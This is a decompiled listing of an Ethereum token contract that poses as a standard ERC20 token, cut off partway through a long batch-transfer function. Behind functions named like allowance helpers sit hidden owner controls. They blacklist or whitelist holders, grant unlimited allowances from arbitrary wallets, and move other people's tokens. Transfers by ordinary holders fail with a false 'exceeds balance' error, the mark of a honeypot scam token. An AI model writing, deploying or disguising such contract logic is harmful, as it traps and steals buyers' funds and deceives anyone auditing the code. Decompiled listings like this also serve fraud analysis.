contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
uint256 stor3;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address _owner;
address stor11;
address stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _owner() payable {
    return _owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function lockLiquidity() payable {
  stop
}

function _fallback() payable {
    revert
}

function decreaseAllowance(address arg1) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor11 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply + arg2 < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if balanceOf[stor10] + arg2 < balanceOf[stor10]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor10] += arg2
    emit Transfer(arg2, 0, arg1);
}

function addApprove(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor2[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 1
        stor1[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function increaseAllowance(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function sub_aa996b92(?) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor1[address(arg1)] = 1
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not stor12:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][stor12] = -1
    emit Approval(-1, arg1, stor12);
}

function sub_9439d5fe(?) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, '!owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(arg1)][address(msg.sender)] = arg2
    emit Approval(arg2, arg1, msg.sender);
    return 1
}

function sub_a55c0552(?) payable {
    require calldata.size - 4 >= 96
    if _owner != msg.sender:
        revert with 0, '!owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != stor11:
        if msg.sender == _owner:
            if msg.sender == arg1:
                stor3 = arg2
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if msg.sender == _owner:
            stor11 = arg1
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if _owner != stor11:
        if arg1 == _owner:
            if arg1 == arg2:
                stor3 = arg3
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    else:
        if arg1 == _owner:
            stor11 = arg2
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if not arg1:
        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[297 len 27]
    if not arg2:
        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[295 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[262 len 26],
                    mem[314 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[360 len 24],
                    mem[408 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[488 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[486 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function sub_e326dddf(?) payable {
    require calldata.size - 4 >= 64
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[96] = arg1.length
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[64] = (32 * arg1.length) + (32 * arg2.length) + 160
    mem[(32 * arg1.length) + 128] = arg2.length
    mem[(32 * arg1.length) + 160 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    mem[(32 * arg1.length) + (32 * arg2.length) + 160] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < mem[96]
        _608 = mem[(32 * idx) + 128]
        require idx < mem[(32 * arg1.length) + 128]
        _610 = mem[(32 * idx) + (32 * arg1.length) + 160]
        if _owner != stor11:
            if msg.sender == _owner:
                if mem[(32 * idx) + 140 len 20] != msg.sender:
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _669 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_669] = 38
                    mem[_669 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _610 > balanceOf[address(msg.sender)]:
                        _741 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_741 + idx + 68] = mem[_669 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_741 + 100] = mem[_741 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _741 + -mem[64] + 132
                else:
                    stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _701 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_701] = 38
                    mem[_701 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _610 > balanceOf[address(msg.sender)]:
                        _782 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_782 + idx + 68] = mem[_701 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_782 + 100] = mem[_782 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _782 + -mem[64] + 132
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _671 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_671] = 38
                        mem[_671 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _610 > balanceOf[address(msg.sender)]:
                            _744 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_744 + idx + 68] = mem[_671 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_744 + 100] = mem[_744 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _744 + -mem[64] + 132
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _703 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_703] = 38
                            mem[_703 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _787 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_787 + idx + 68] = mem[_703 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_787 + 100] = mem[_787 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _787 + -mem[64] + 132
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _747 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_747] = 38
                            mem[_747 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _827 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_827 + idx + 68] = mem[_747 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_827 + 100] = mem[_827 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _827 + -mem[64] + 132
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _717 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_717] = 38
                            mem[_717 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _798 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_798 + idx + 68] = mem[_717 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_798 + 100] = mem[_798 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _798 + -mem[64] + 132
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _760 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_760] = 38
                                mem[_760 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _610 > balanceOf[address(msg.sender)]:
                                    _839 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_839 + idx + 68] = mem[_760 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_839 + 100] = mem[_839 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _839 + -mem[64] + 132
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg1.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _801 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_801] = 38
                                mem[_801 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _610 > balanceOf[address(msg.sender)]:
                                    _887 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_887 + idx + 68] = mem[_801 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_887 + 100] = mem[_887 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _887 + -mem[64] + 132
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _681 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_681] = 38
                            mem[_681 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _610 > balanceOf[address(msg.sender)]:
                                _757 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_757 + idx + 68] = mem[_681 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_757 + 100] = mem[_757 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _757 + -mem[64] + 132
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _794 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_794] = 38
                                    mem[_794 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _610 > balanceOf[address(msg.sender)]:
                                        _877 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_877 + idx + 68] = mem[_794 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_877 + 100] = mem[_877 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _877 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _834 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_834] = 38
                                    mem[_834 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _610 > balanceOf[address(msg.sender)]:
                                        _935 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_935 + idx + 68] = mem[_834 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_935 + 100] = mem[_935 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _935 + -mem[64] + 132
                            else:
                                if mem[(32 * idx) + (32 * arg1.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _830 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_830] = 38
                                        mem[_830 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _925 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_925 + idx + 68] = mem[_830 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_925 + 100] = mem[_925 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _925 + -mem[64] + 132
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _872 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_872] = 38
                                        mem[_872 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _610 > balanceOf[address(msg.sender)]:
                                            _988 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_988 + idx + 68] = mem[_872 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_988 + 100] = mem[_988 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _988 + -mem[64] + 132
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
